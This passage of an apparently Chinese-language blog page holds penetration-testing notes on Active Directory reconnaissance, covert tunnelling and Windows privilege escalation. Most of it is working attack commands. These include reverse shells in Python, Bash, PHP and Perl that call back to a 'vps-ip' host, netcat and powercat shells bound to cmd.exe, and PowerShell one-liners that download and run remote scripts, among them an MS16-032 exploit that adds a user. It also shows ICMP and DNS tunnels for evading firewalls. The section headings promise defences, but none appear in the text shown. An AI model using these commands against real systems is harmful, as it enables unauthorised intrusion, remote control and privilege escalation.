+<h3 id=153-域内用户详细信息-wmic-useraccount-get-all>1.5.3. 域内用户详细信息 <code>wmic useraccount get /all</code></h3>
+<h3 id=154-域内存在的用户-dsquery-user>1.5.4. 域内存在的用户 <code>dsquery user</code></h3>
+<h2 id=16-定位域管理员>1.6. 定位域管理员</h2>
+<h3 id=161-psloggedonexehttpsdocsmicrosoftcomen-ussysinternalsdownloadspsloggedon--dc>1.6.1. <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon target=_blank>psloggedon.exe</a> \\DC</h3>
+<h3 id=162-pvefindaduserexehttpsgithubcomchrisdeetoolstreemasteradadfindusersloggedon--current>1.6.2. <a href=https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn target=_blank>PVEFindADUser.exe</a> -current</h3>
+<h3 id=163-netviewexehttpsgithubcommubixnetviewgit>1.6.3. <a href=https://github.com/mubix/netview.git target=_blank>netview.exe</a></h3>
+<h3 id=164-nmap---script-smb-enum-sessions--ip>1.6.4. nmap &ndash;script smb-enum-sessions &lt;ip></h3>
+<ul>
+<li>smb-enum-domains 对DC进行信息收集</li>
+<li>smb-enum-users 枚举域内用户</li>
+<li>smb-enum-shares 枚举共享目录</li>
+<li>smb-enum-process 枚举进程</li>
+<li>smb-enum-sessions 枚举域内用户登录会话</li>
+<li>smb-os-discovery 收集系统信息</li>
+</ul>
+<h3 id=165-powersploithttpsgithubcompowershellempirepowertoolstreemasterpowerview>1.6.5. <a href=https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView target=_blank>PowerSploit</a></h3>
+<h3 id=heading></h3>
+<h3 id=166-empire-situaltional_awarenessnetworkpowerviewuser_hunter>1.6.6. Empire >situaltional_awareness/network/powerview/user_hunter</h3>
+<h2 id=17-查找域管理进程>1.7. 查找域管理进程</h2>
+<h3 id=171-dc的域用户会话>1.7.1. DC的域用户会话</h3>
+<ul>
+<li>域控制器列表 <code>net group "domain controllers" /domain >dics.txt</code></li>
+<li>域管理员列表 <code>net group "domain admins" /domain >admins.txt</code></li>
+<li>活动域会话列表 <code>netsess.exe -h</code></li>
+<li><a href=https://github.com/nullbind/Other-Projects/tree/master/GDA target=_blank>域用户会话-GDA</a></li>
+</ul>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>  for /f %i in (dcs.txt) do
+  @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;null &gt;sessions.txt &amp;&amp; 
+  for /f %a in (admins.txt) do
+  @type sessions.txt | @findstr /I %a
+</code></pre><h3 id=172-远程系统中运行的任务>1.7.2. 远程系统中运行的任务</h3>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>step1: net group &quot;domain admins&quot; /domain &gt; admins.txt
+step2: netsess -h &gt;ips.txt
+step3: for /f %ip in (ips.txt) do 
+       @echo [+] %ip &amp;&amp; @tasklist /v /s %ip /U user /P password 2&gt;null &gt;output.txt &amp;&amp;
+       for /f %admin in (admins.txt) do
+       @type output.txt | @findstr %admin &gt;null &amp;&amp; @echo [!] %admin was found running a process on %ip &amp;&amp; pause
+</code></pre><h3 id=173-扫描远程系统netbios信息>1.7.3. 扫描远程系统NetBIOS信息</h3>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>    for /f %ip in (ips.txt) do 
+    @echo [+] Checking %ip &amp;&amp; nbtstat -A &amp;ip 2&gt;null &gt;nbsession.txt &amp;&amp;
+    for /f %user in (admins.txt) do
+    @type nbsessions.txt | findstr /I %user &gt;null &amp;&amp; echo [!] %user was found logged into %ip
+</code></pre><h3 id=174-域用户的进程-tasklist-v--findstr-hacker->1.7.4. 域用户的进程 <code>tasklist /v | findstr "hacker" </code></h3>
+<h2 id=18-域分析工具bloodhoundhttpsgithubcombloodhoundadbloodhoundreleases>1.8. 域分析工具<a href=https://github.com/BloodHoundAD/BloodHound/releases target=_blank>Bloodhound</a></h2>
+<h2 id=19-探测域内存活主机>1.9. 探测域内存活主机</h2>
+<h3 id=191-利用netbios探测-nbtexe-1921681024>1.9.1. 利用NetBIOS探测 <code>nbt.exe 192.168.1.0/24</code></h3>
+<h3 id=192-利用icmp协议探测>1.9.2. 利用ICMP协议探测</h3>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>for /L %I in (1,1,254) do @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;
+</code></pre><h3 id=193-利用arp协议探测-arpexe--t-1921681024>1.9.3. 利用ARP协议探测 <code>arp.exe -t 192.168.1.0/24</code></h3>
+<ul>
+<li>Empire>usemodule powershell/situational_awareness/network/arpscan</li>
+<li>Powershell
+<ul>
+<li><code>powershell.exe -exec bypass -command "& {import-module C:\windows\temp\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/24}" >> C:\windows\temp\log.txt</code></li>
+</ul>
+</li>
+</ul>
+<h3 id=194-通过tcpudp协议探测-nmap--st--su->1.9.4. 通过TCP/UDP协议探测 <code>nmap -sT -sU </code></h3>
+<h2 id=110-扫描域内端口>1.10. 扫描域内端口</h2>
+<h3 id=1101-netcat扫描>1.10.1. netcat扫描</h3>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>nc -nvv -w 1 -z 10.1.1.1 3388-27017      //TCP  
+nc -nvv -w 1 -z -u 10.1.1.1 3388-3389   //UDP
+</code></pre><h3 id=1102-利用telnet命令扫描-telnet-ip-port>1.10.2. 利用telnet命令扫描 <code>telnet &lt;ip> &lt;port></code></h3>
+<h3 id=1103-利用msfconsole--use-auxiliaryscannerportscantcp>1.10.3. 利用msfconsole <code>use auxiliary/scanner/portscan/tcp</code></h3>
+<h3 id=1104-利用powersploit-invoke-portscan>1.10.4. 利用powersploit <code>Invoke-Portscan</code></h3>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>powershell.exe -nop -exec bypass -c &quot;IEX(New-object Net.webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,8080,3389,80' -oA C:windows\temp
+es.txt &quot;
+</code></pre><h3 id=1105-利用nishang-invoke-portscan>1.10.5. 利用Nishang <code>Invoke-Portscan</code></h3>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>Invoke-Portscan -StartAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost
+</code></pre><h1 id=2-隐藏通信隧道技术>2. 隐藏通信隧道技术</h1>
+<h2 id=21-基础知识>2.1. 基础知识</h2>
+<h3 id=211-隧道-一种绕过端口屏蔽的通信方式>2.1.1. 隧道-一种绕过端口屏蔽的通信方式</h3>
+<blockquote>
+<p>攻击机发出的数据包封装成防火墙允许的数据包格式，经过防火墙允许的端口，从而穿过防火墙，与目标机进行通信。</p>
+</blockquote>
+<ul>
+<li><strong>网络层</strong> ：IPv6，ICMP，GRE</li>
+<li><strong>传输层</strong>：TCP，UDP，常规端口转发</li>
+<li><strong>应用层</strong>：SSH，HTTP，HTTPS，DNS</li>
+</ul>
+<h3 id=212-内网连通性判断>2.1.2. 内网连通性判断</h3>
+<blockquote>
+<p>判断域内及其能否上外网</p>
+<p>内网中是否有proxy server</p>
+<ol>
+<li>查看内网hostname=*proxy*<br>
+<code>curl www.baidu.com //不同</code><br>
+<code>curl -x proxy-ip:port www.baidu.com //通</code></li>
+</ol>
+</blockquote>
+<h4 id=2121-icmp协议-ping--baiducom>2.1.2.1. ICMP协议 <code>ping baidu.com</code></h4>
+<h4 id=2122-tcp协议-nc--zv-target--port>2.1.2.2. TCP协议 <code>nc -zv &lt;target> &lt;port></code></h4>
+<h4 id=2123-https协议-curl-targetport>2.1.2.3. HTTP(S)协议 <code>curl &lt;target>:&lt;port></code></h4>
+<h4 id=2124-dns协议-dig-vps-ip-wwwbaiducom-a>2.1.2.4. DNS协议 <code>dig @vps-ip www.baidu.com A</code></h4>
+<blockquote>
+<p>windows : <code>nslookup www.baidu.com vips-ip</code></p>
+</blockquote>
+<h2 id=22-网络层层隧道技术>2.2. 网络层层隧道技术</h2>
+<h3 id=221-ipv6隧道-socat6tunnelnt6tunnel>2.2.1. IPv6隧道-socat，6tunnel，nt6tunnel</h3>
+<blockquote>
+<p>将IPv6数据报文封装在IPv4数据报文中</p>
+</blockquote>
+<h3 id=222-icmp隧道-icmpshpingtunnelicmptunnelpowershell-icmp>2.2.2. ICMP隧道-icmpsh,pingTunnel,icmptunnel,powershell icmp</h3>
+<blockquote>
+<p>将TCP/UDP数据包封装到ICMP的ping数据包中，从而穿过防火墙，实现不受限制的网络访问</p>
+</blockquote>
+<h4 id=2221-icmpshhttpsgithubcominquisbicmpsh>2.2.2.1. <a href=https://github.com/inquisb/icmpsh target=_blank>icmpsh</a></h4>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>    target:
+           icmpsh.exe -t kali-ip  -d 500 -b 30 -s 128
+    kali:
+    apt install python-impacket
+    git clone https://github.cominquisb/icmpsh.git /opt/icmpsh
+    sysctl -w net.ipv4_icmp_echo_ignore_all=1
+    ./run.sh
+</code></pre><h4 id=2222-pingtunnelhttpwwwcsuitnodanielspingtunnelpingtunnel-072targz>2.2.2.2. <a href=http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz target=_blank>PingTunnel</a></h4>
+<blockquote>
+<p><a href=http://www.cs.uit.no/~daniels/PingTunnel/index.html target=_blank>http://www.cs.uit.no/~daniels/PingTunnel/index.html</a></p>
+</blockquote>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>    kali:192.168.10    
+    web server:192.168.1.4   /1.1.1.x
+    sql server:1.1.1.10
+kali:
+ptunnel -p 192.168.1.4 -lp 1080 -da 1.1.1.10 -dp 3389
+</code></pre><h2 id=23-传输层隧道技术>2.3. 传输层隧道技术</h2>
+<h3 id=231-socket隧道lcxportmap端口转发>2.3.1. Socket隧道：LCX/portmap端口转发</h3>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>&gt;端口转发
+target: lcx.exe -slave vps-ip 4444 127.0.0.1 3389 //将本机3389端口所有数据转发到vps-ip上的4444端口
+vps-ip: lcx.exe -listen 4444 5555   //将本地4444端口监听的数据转发到5555端口
+        mstsc //127.0.0.1:5555-&gt;target:3389
+&gt;本地端口映射
+target: lcx.exe -tran 53 127.0.0.1 3389 //防火墙禁止3389后，可将3389端口数据转发到本地53端口
+</code></pre><h3 id=232-netcat>2.3.2. Netcat</h3>
+<h4 id=2321-常见使用场景>2.3.2.1. 常见使用场景</h4>
+<blockquote>
+<p>banner获取 <code>nc -nv ip port </code><br>
+连接主机<code>nc -nvv ip port </code><br>
+扫描端口<code>nc -v -z ip port1-port2</code><br>
+监听端口<code>nc -l -p 9999</code><br>
+简易聊天室</p>
+<ul>
+<li>服务端：<code>nc -lp 8888</code></li>
+<li>客户器：<code>nc -nv &lt;client-ip> 8888</code><br>
+文件传输</li>
+<li>接收方 ：<code>nc -lp 8888 > 1.txt</code> //192.168.1.1</li>
+<li>发送方：<code>nc -nv 192.168.1.1 8888 &lt; test.txt -q 1</code></li>
+</ul>
+</blockquote>
+<h4 id=2322-获取shell>2.3.2.2. 获取shell</h4>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>&gt;正向shell:    客户端       ----&gt;    服务器的shell  //客户端获取服务器的shell
+客户端(192.168.1.114):
+        nc 10.10.10.115 4444
+服务器(10.10.10.115):
+     nc -lvp 4444 -e /bin/sh    //linux
+     nc -lvp 4444 -e c:\windows\system32\cmd.exe  //windows
+
+&gt;反向shell：  客户端的shell &lt;----    服务器       //服务器获取客户端的shell
+服务器(10.10.10.115)：
+    nc -lvp 9999
+客户端(192.168.1.114):
+    nc 10.10.10.115 9999 -e /bin/sh  //linux
+    nc 10.10.10.115 9999 -e c:\windows\system32\cmd.exe   //windows
+</code></pre><h4 id=2323-获取反向shell>2.3.2.3. 获取反向shell</h4>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>vps: nc -lvp 2222
+
+&gt;-----python反向shell-------
+python -c '
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect((&quot;vps-ip&quot;,2222));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
+'
+
+&gt;-----------Bash反向shell---------
+bash -i &gt;&amp; /dev/tcp/vps-ip/4444 0&gt;&amp;1
+
+&gt;-----------PHP反向shell---------
+php -r '
+$sock=fsockopen(&quot;vps-ip&quot;,2222);
+exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);
+'
+&gt;----------Perl反向shell--------
+perl -e '
+use Socket;
+$i=&quot;192.168.1.117&quot;;$p=4444;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){
+    open(STDIN,&quot;&gt;&amp;S&quot;);
+    open(STDOUT,&quot;&gt;&amp;S&quot;);
+    open(STDERR,&quot;&gt;&amp;S&quot;);
+    exec(&quot;/bin/sh -i&quot;);
+    };
+'
+&gt;
+</code></pre><h4 id=2324-netcat内网代理>2.3.2.4. Netcat内网代理</h4>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>---------------------------------------------------------------
+VPS(192.168.1.4)            Web Server(192.168.1.1/1.1.1.116)
+                            MySQL Server(1.1.1.200)
+----------------------------------------------------------------
+step1:
+vps: nc -lvp 3333
+step2:
+MySQL:nc -lvp 3333 -e /bin/sh
+step3:
+Web  :nc -v 192.168.1.4 3333 -c &quot;nc -v 1.1.1.200 3333&quot;
+&gt;
+</code></pre><h3 id=233-powercathttpsgithubcombesimorhinopowercatgit>2.3.3. <a href=https://github.com/besimorhino/powercat.git target=_blank>PowerCat</a></h3>
+<blockquote>
+<p>nc的powershell版本</p>
+</blockquote>
+<h4 id=2331-powercat常用操作>2.3.3.1. powercat常用操作</h4>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>#powercat正向shell
+win10(192.168.1.119):
+    powercat -l -p 8888 -e cmd.exe -v 
+kali(192.168.1.119):  
+    nc 192.168.1.119 8888
+-------------------------------
+#powercat反弹shell
+win10(192.168.1.119):
+    powercat -c 192.168.1.119 -p 8888 -v -e cmd.exe
+kali(192.168.1.119): 
+    nc -lvp 8888
+--------------------------------------
+#返回powershell
+powercat -c vps -p 9999 -v -ep 
+-----------------------------
+#传输文件
+powercat -l -p 8888 -of test.txt -v 
+powercat -c vps 8888 -i c:\test.txt -v 
+-----------------------------
+#生成payload
+powercat -l -p 8888 -e cmd -v -ge &gt;&gt;shell.ps1
+&gt;
+</code></pre><h4 id=2332-powercat-dns隧道通信>2.3.3.2. powercat DNS隧道通信</h4>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>kali :192.168.1.117        win10:192.168.1.119
+---------------------------------------
+kali: ruby dnscat2.rb -e open --no-cache ttpowercat.test
+win10: powercat -c 192.168.1.117 -p 53 -dns ttpowercat.test -e cmd.exe
+</code></pre><h2 id=24-应用层隧道技术>2.4. 应用层隧道技术</h2>
+<h3 id=241-ssh协议隧道>2.4.1. SSH协议隧道</h3>
+<p><a href=http://arondight.me/2016/02/17/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/ target=_blank>使用SSH反向隧道进行内网穿透 </a></p>
+<h4 id=2411-本地端口转发>2.4.1.1. 本地端口转发</h4>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>kali: 192.168.1.117       MacBook  :192.168.1.121
+                          win10    :192.168.1.119 
+---------------------------------------------------
+kali:     127.0.0.1:444  --&gt; 192.168.1.119:3389
+    ssh -CfNg -L 4444:192.168.1.119:3389  ethan@192.168.1.121
+</code></pre><h4 id=2412-远程端口转发>2.4.1.2. 远程端口转发</h4>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>kali: 192.168.1.117       MacBook  :192.168.1.121
+                          win10    :192.168.1.119 
+---------------------------------------------------
+MacBook:     192.168.1.117:4444  --&gt; 192.168.1.119:3389
+    ssh -CfNg -R 4444:192.168.1.119:3389  kali@192.168.1.117
+</code></pre><h4 id=2413-动态端口转发加密socks>2.4.1.3. 动态端口转发（加密socks)</h4>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>kali: 192.168.1.117       MacBook  :192.168.1.121
+                          win10    :192.168.1.119 
+---------------------------------------------------
+kali:     192.168.1.117:4444  --&gt; 192.168.1.119:3389
+    ssh -CfNg -D 4444  ethan@192.168.1.121
+</code></pre><h3 id=242-httphttps协议隧道>2.4.2. HTTP/HTTPS协议隧道</h3>
+<h4 id=2421-regeorghttpsgithubcomsensepostregeorggit>2.4.2.1. <a href=https://github.com/sensepost/reGeorg.git target=_blank>reGeorg</a></h4>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
+</code></pre><h4 id=2422-proxytunnelhttpsgithubcomproxytunnelproxytunnelgit>2.4.2.2. <a href=https://github.com/proxytunnel/proxytunnel.git target=_blank>proxytunnel</a></h4>
+<h3 id=243-dns协议隧道>2.4.3. DNS协议隧道</h3>
+<h4 id=2431-dnscat2httpsgithubcomiagox86dnscat2git>2.4.3.1. <a href=https://github.com/iagox86/dnscat2.git target=_blank>Dnscat2</a></h4>
+<h4 id=2432-iodinehttpsgithubcomyarrickiodinegit>2.4.3.2. <a href=https://github.com/yarrick/iodine.git target=_blank>iodine</a></h4>
+<h2 id=25-socks代理>2.5. SOCKS代理</h2>
+<blockquote>
+<p>Socket隧道具备2端<br>
+服务端：监听一个端口，等待客户端连接<br>
+客户端：传入服务端IP地址和端口，才能主动与服务器连接</p>
+</blockquote>
+<h3 id=251-proxychainshttpproxychainssourceforgenet>2.5.1. <a href=http://proxychains.sourceforge.net/ target=_blank>Proxychains</a></h3>
+<h3 id=252-sockscap64httpswwwsockscap64com>2.5.2. <a href=https://www.sockscap64.com/ target=_blank>SocksCap64</a></h3>
+<h3 id=253-proxifierhttpswwwproxifiercom>2.5.3. <a href=https://www.proxifier.com target=_blank>Proxifier</a></h3>
+<h3 id=254-earthwormhttpsgithubcomrootkiterearthwormgit>2.5.4. <a href=https://github.com/rootkiter/EarthWorm.git target=_blank>EarthWorm</a></h3>
+<h3 id=255-termitehttpsgithubcomrootkitertermitegit>2.5.5. <a href=https://github.com/rootkiter/Termite.git target=_blank>Termite</a></h3>
+<h3 id=256-regeorghttpsgithubcomsensepostregeorggit>2.5.6. <a href=https://github.com/sensepost/reGeorg.git target=_blank>reGeorg</a></h3>
+<h2 id=26-数据通信>2.6. 数据通信</h2>
+<h3 id=261-压缩数据>2.6.1. 压缩数据</h3>
+<p><a href=https://www.7-zip.org/ target=_blank>7zip</a></p>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>&gt;压缩文件：
+7z.exe  a -r -p12345 E:\path\to\file.7z   C:\path\to\file\
+&gt;解压文件：
+&gt;7z.exe x -p12345  E:\path\to\file.7z -o E:\x
+
+</code></pre><h3 id=262-传输数据>2.6.2. 传输数据</h3>
+<blockquote>
+<p><a href=https://mp.weixin.qq.com/s/tINvBuhiZwz7MbA_sffapA target=_blank>https://mp.weixin.qq.com/s/tINvBuhiZwz7MbA_sffapA</a></p>
+</blockquote>
+<h3 id=263-利用ftp协议>2.6.3. 利用FTP协议</h3>
+<h3 id=264-利用debug上传>2.6.4. 利用Debug上传</h3>
+<h3 id=265-利用nishang上传-download-execute>2.6.5. 利用Nishang上传-download-execute</h3>
+<h3 id=266-利用bitsadmin下载>2.6.6. 利用bitsadmin下载</h3>
+<h3 id=267-利用powershell下载>2.6.7. 利用powershell下载</h3>
+<h1 id=3-windows权限提升分析及防御>3. Windows权限提升分析及防御</h1>
+<h2 id=31-系统内核溢出漏洞提权分析及防范>3.1. 系统内核溢出漏洞提权分析及防范</h2>
+<p><a href=https://github.com/SecWiki/windows-kernel-exploits.git target=_blank>Windows Exploit Suggester</a></p>
+<h3 id=311-ms16-032提权-kb3139914>3.1.1. MS16-032提权-KB3139914</h3>
+<pre tabindex=0><code class=language-ssh data-lang=ssh>powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.Webclient).DownloadString(&quot;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&quot;);Invoke-MS16-032 -Application cmd.exe -Commandline '/c net admins 12345 /add' &quot;
+
+</code></pre><h2 id=32-windows操作系统配置错误利用分析及防范>3.2. windows操作系统配置错误利用分析及防范</h2>
+<h3 id=321-注册表键alwaysinstallelevated>3.2.1. 注册表键AlwaysInstallElevated</h3>
+<blockquote>
+<p>gpedit.msc >windows Installer-永远以高权限进行安装</p>
+</blockquote>
+<h3 id=322-可信任服务路径漏洞>3.2.2. 可信任服务路径漏洞</h3>
+<blockquote>
+<p>一个服务的可执行文件的路径没有被双引号引起来，且包含空格，则存在此漏洞</p>
+<ul>
+<li>若路径与服务有关，则创建一个服务或编译service模版</li>
+<li>若路径与可执行文件有关，则创建一个可执行文件</li>
+</ul>
+</blockquote>
+<h2 id=33-组策略首选项提权分析及防范>3.3. 组策略首选项提权分析及防范</h2>
+<h2 id=34-绕过uac提权分析及防范>3.4. 绕过UAC提权分析及防范</h2>
+<h2 id=35-令牌窃取分析及防范>3.5. 令牌窃取分析及防范</h2>
+<h2 id=36-无凭证条件下的权限分析及防范>3.6. 无凭证条件下的权限分析及防范</h2>
+</article>
+</div>
+<div class=grow></div>
+<nav class=pagination-single>
+<a href=http://crkmythical.github.io/blog/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E5%BF%B5/ title=代码审计概念 class=pagination-single__left>
+<div class=pagination-single__icon><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentcolor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03.0-1.42s-1.02-.39-1.41.0l-6.59 6.59c-.39.39-.39 1.02.0 1.41l6.59 6.59c.39.39 1.02.39 1.41.0s.39-1.02.0-1.41L7.83 13H19c.55.0 1-.45 1-1s-.45-1-1-1z"/></svg>
+</div>
+<div class=pagination-single__right-title>代码审计概念</div>
+</a>
+<div class=grow></div>
+<a href=http://crkmythical.github.io/blog/tmux/ title=Tmux class=pagination-single__right>
+<div class=pagination-single__left-title>Tmux</div>
+<div class=pagination-single__icon><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentcolor" d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03.0 1.42.39.39 1.02.39 1.41.0l6.59-6.59c.39-.39.39-1.02.0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41.0s-.39 1.02.0 1.41L16.17 11H5c-.55.0-1 .45-1 1s.45 1 1 1z"/></svg>
+</div>
+</a>
+</nav>
+</article>
+<section id=list-side class=r data-dir=ltr>
+<div class=toc>
+<h6 class=toc__label>What's on this Page</h6>
+<div class=toc__body>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#11-本机信息>1.1. 本机信息</a>
+<ul>
+<li><a href=#111-手动收集>1.1.1. 手动收集</a>
+<ul>
+<li><a href=#1111-用户列表管理员-net-user--net-localgroup-administrators>1.1.1.1. 用户列表/管理员 <code>net user | net localgroup administrators</code></a></li>
+<li><a href=#1112-网络配置----ipconfig-all>1.1.1.2. 网络配置 <code>ipconfig /all</code></a></li>
+<li><a href=#1113-操作系统及补丁-wmic-qfe-list-brieftmptxt>1.1.1.3. 操作系统及补丁 <code>wmic qfe list brief>tmp.txt</code></a></li>
+<li><a href=#1114-系统架构-echo-processor_architecture>1.1.1.4. 系统架构 <code>echo %processor_architecture%</code></a></li>
+<li><a href=#1115-本机服务信息-wmic-service-list-brieftmptxt>1.1.1.5. 本机服务信息 <code>wmic service list brief>tmp.txt</code></a></li>
+<li><a href=#1116-安装软件-wmic-product-get-nameversioninstalllocation-tmptxt>1.1.1.6. 安装软件 <code>wmic product get name,version,installlocation >tmp.txt</code></a></li>
+<li><a href=#1117-端口列表-netstat--ano>1.1.1.7. 端口列表 <code>netstat -ano</code></a></li>
+<li><a href=#1118-进程列表-wmic-process-list-brieftmptxt>1.1.1.8. 进程列表 <code>wmic process list brief>tmp.txt</code></a></li>
+<li><a href=#1119-开机自动程序-wmic-startup-list-brief-tmptxt>1.1.1.9. 开机自动程序 <code>wmic startup list brief >tmp.txt</code></a></li>
+<li><a href=#11110-计划任务-schtasks-query-fo-table-v-tmptxt>1.1.1.10. 计划任务 <code>schtasks /query /fo table /v >tmp.txt</code></a></li>
+<li><a href=#11111-本地计算机和所连接客户端之间会话-net-session>1.1.1.11. 本地计算机和所连接客户端之间会话 <code>net session</code></a></li>
+<li><a href=#11112-本机共享列表-wmic-share-get-namepathstatus-tmptxt>1.1.1.12. 本机共享列表 <code>wmic share get name,path,status >tmp.txt</code></a></li>
+<li><a href=#11113-路由表arp缓存表-route-print--arp--a>1.1.1.13. 路由表/ARP缓存表 <code>route print | arp -a</code></a></li>
+<li><a href=#11114-防火墙相关配置>1.1.1.14. 防火墙相关配置</a></li>
+<li><a href=#11115-代理配置-reg-query-hkey_current_usersoftwaremicrosoftwindowscurrentversioninternet-settings>1.1.1.15. 代理配置 <code>reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"</code></a></li>
+<li><a href=#11116-开启rdp服务>1.1.1.16. 开启RDP服务</a></li>
+</ul>
+</li>
+<li><a href=#112-自动收集>1.1.2. 自动收集</a>
+<ul>
+<li><a href=#1121-wmicwwwfuzzysecuritycomscriptsfileswmic_inforar信息收集>1.1.2.1. <a href=www.fuzzysecurity.com/scripts/files/wmic_info.rar>wmic</a>信息收集</a></li>
+<li><a href=#1122-empirehttpsgithubcombc-securityempiregit信息收集>1.1.2.2. <a href=https://github.com/BC-SECURITY/Empire.git>Empire</a>信息收集</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href=#12-判断域环境>1.2. 判断域环境</a>
+<ul>
+<li><a href=#121-是否存在域-systeminfo--findstr->1.2.1. 是否存在域 <code>systeminfo | findstr "\."</code></a></li>
+<li><a href=#122-dns与本机是否网段-ipconfig-all>1.2.2. DNS与本机是否网段 <code>ipconfig /all</code></a></li>
+<li><a href=#123-dns与域是否同ip-nslookup-hackertestlab>1.2.3. DNS与域是否同IP <code>nslookup hacker.testlab</code></a></li>
+<li><a href=#124-当前登录域及登录用户信息-net-config-workstation>1.2.4. 当前登录域及登录用户信息 <code>net config workstation</code></a></li>
+<li><a href=#125-判段主域-net-time-domain>1.2.5. 判段主域 <code>net time /domain</code></a></li>
+<li><a href=#126-获取域sid-whoami-all>1.2.6. 获取域SID <code>whoami /all</code></a></li>
+<li><a href=#127-指定域用户详细信息-net-user-xxx-domain>1.2.7. 指定域用户详细信息 <code>net user xxx /domain</code></a></li>
+</ul>
+</li>
+<li><a href=#13-搜集域内基础信息>1.3. 搜集域内基础信息</a>
+<ul>
+<li><a href=#131-查询域-net-view-domain>1.3.1. 查询域 <code>net view /domain</code></a></li>
+<li><a href=#132-查询域内所有主机-net-view-domainhacker>1.3.2. 查询域内所有主机 <code>net view /domain:hacker</code></a></li>
+<li><a href=#133-查询域内所有用户组列表-net-group-domain>1.3.3. 查询域内所有用户组列表 <code>net group /domain</code></a></li>
+<li><a href=#134-查询域内成员计算机列表-net-gorup-domain-computers-domain->1.3.4. 查询域内成员计算机列表 <code>net gorup "domain computers" /domain </code></a></li>
+<li><a href=#135-获取域密码信息-net-accounts-domain->1.3.5. 获取域密码信息 <code>net accounts /domain </code></a></li>
+<li><a href=#136-获取域信任信息-nltest-domain_trusts>1.3.6. 获取域信任信息 <code>nltest /domain_trusts</code></a></li>
+</ul>
+</li>
+<li><a href=#14-查找域控制器>1.4. 查找域控制器</a>
+<ul>
+<li><a href=#141-dc组-net-group-domain-controllers-domain>1.4.1. DC组 <code>net group "domain controllers" /domain</code></a></li>
+<li><a href=#142-dc机器名-nltest-dclisthacker>1.4.2. DC机器名 <code>nltest /dclist:hacker</code></a></li>
+<li><a href=#143-dc主机名-nslookup--typesrv-_ldap_tcp>1.4.3. DC主机名 <code>nslookup -type=srv _ldap._tcp</code></a></li>
+<li><a href=#144-主域dc-netdom-query-pdc>1.4.4. 主域DC <code>netdom query pdc</code></a></li>
+</ul>
+</li>
+<li><a href=#15-获取域内用户和管理员信息>1.5. 获取域内用户和管理员信息</a>
+<ul>
+<li><a href=#151-域内用户列表-net-user-domain>1.5.1. 域内用户列表 <code>net user /domain</code></a></li>
+<li><a href=#152-域管理员用户-net-group-domain-admins-domain->1.5.2. 域管理员用户 <code>net group "domain admins" /domain </code></a></li>
+<li><a href=#153-域内用户详细信息-wmic-useraccount-get-all>1.5.3. 域内用户详细信息 <code>wmic useraccount get /all</code></a></li>
+<li><a href=#154-域内存在的用户-dsquery-user>1.5.4. 域内存在的用户 <code>dsquery user</code></a></li>
+</ul>
+</li>
+<li><a href=#16-定位域管理员>1.6. 定位域管理员</a>
+<ul>
+<li><a href=#161-psloggedonexehttpsdocsmicrosoftcomen-ussysinternalsdownloadspsloggedon--dc>1.6.1. <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon>psloggedon.exe</a> \\DC</a></li>
